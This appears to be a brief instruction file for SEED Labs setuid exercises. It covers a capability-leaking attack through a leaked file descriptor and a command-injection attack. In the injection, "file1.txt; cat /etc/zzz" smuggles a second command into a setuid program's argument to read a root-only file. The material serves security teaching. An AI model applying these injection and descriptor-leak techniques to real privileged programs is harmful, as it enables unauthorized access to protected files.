Instructions
===

Run capability-leaking attack
---

```
make clean
make attack-capability-leaking
#this will fail, which is expected.
./a.out
#fd is 3
#sh-3.2$ 
#in the above prompt, type the following:
echo yyy >&3
```

Toggle the protection on, in the setuid.c
```

Run seed-setuidlab-task8 attack
---

```
make clean
make attack-seed-setuidlab-task8
touch file1.txt
echo xxx > file1.txt 
./a.out file1.txt 
touch /etc/zzz
sudo chmod 700 /etc/zzz
ls -ltr /etc/zzz
cat /etc/zzz
./a.out "file1.txt; cat /etc/zzz" 
```
